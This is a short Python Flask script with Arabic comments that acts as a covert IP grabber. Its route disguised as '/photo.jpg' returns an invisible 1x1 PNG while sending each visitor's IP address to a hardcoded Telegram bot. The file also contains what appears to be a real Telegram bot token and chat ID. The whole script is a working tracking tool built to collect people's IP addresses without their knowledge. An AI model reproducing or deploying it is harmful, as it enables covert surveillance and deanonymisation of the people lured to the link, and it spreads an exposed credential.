from flask import Flask, request, send_file
import requests
import io

app = Flask(__name__)

TOKEN = "8459471902:AAHLHHniOWAQSDznm5TFWWmUzROr9cf_CUo"
CHAT_ID = "8524242091"

@app.route('/')
@app.route('/photo.jpg')
def index():
    # سحب الـ IP من هيدرز Vercel
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
    
    # رسالة ترحيبية وتنبيه بالـ IP
    text = f"🚨 <b>تم رصد اصطياد صامت!</b>\n\n🌐 <b>IP:</b> <code>{ip}</code>"
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={text}&parse_mode=HTML"
    
    try:
        requests.get(url, timeout=10)
    except:
        pass

    # إرجاع الصورة الشفافة التي رأيناها في لقطة الشاشة السابقة
    pixel = io.BytesIO(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82')
    return send_file(pixel, mimetype='image/png')

if __name__ == "__main__":
    app.run()
